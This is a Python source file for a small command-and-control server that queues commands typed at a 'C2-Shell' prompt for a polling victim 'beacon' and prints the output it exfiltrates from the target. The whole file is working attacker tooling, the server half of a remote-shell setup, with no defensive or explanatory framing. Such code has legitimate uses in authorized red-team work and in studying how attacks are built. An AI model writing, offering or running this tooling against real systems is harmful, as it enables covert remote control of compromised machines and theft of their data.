import http.server
import socketserver
import sys

# Define port to listen on
PORT = 8080

# Global variable to hold the next command for the beacon (victim)
current_command = "NONE"

class C2Handler(http.server.BaseHTTPRequestHandler):
    global current_command

    # Silence standard HTTP logging to keep output clean
    def log_message(self, format, *args):
        return

    # Handle incoming GET requests (Beacon checking in for a command)
    def do_GET(self):
        global current_command
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        
        # If a command is waiting, send it to the beacon
        if current_command != "NONE":
            self.wfile.write(bytes(current_command, "utf-8"))
            current_command = "NONE"  # Reset after sending
        else:
            self.wfile.write(bytes("NONE", "utf-8"))

    # Handle incoming POST requests (Beacon returning command execution results)
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\n[+] Exfiltrated Output From Target:")
        print("-" * 40)
        print(post_data)
        print("-" * 40)
        
        self.send_response(200)
        self.end_headers()

def run_server():
    global current_command
    # Allow address reuse to prevent "Address already in use" errors during testing
    socketserver.TCPServer.allow_reuse_address = True
    
    with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
        print(f"[*] C2 Server active on port {PORT}...")
        print("[*] Waiting for beacon connections. Type 'exit' to quit.")
        
        # Interactive loop to take attacker commands
        while True:
            try:
                # Prompt the attacker for the next command
                cmd = input("\nC2-Shell> ")
                if cmd.lower() == 'exit':
                    print("[*] Shutting down listener...")
                    sys.exit(0)
                if cmd.strip():
                    current_command = cmd
                    print(f"[*] Command '{cmd}' queued. Waiting for next beacon check-in...")
                    
                    # 1. Process the GET request to drop the command payload
                    httpd.handle_request()

                    # 2. Immediately process the tracking POST request returning the results
                    httpd.handle_request()
            except KeyboardInterrupt:
                break

if __name__ == "__main__":
    run_server()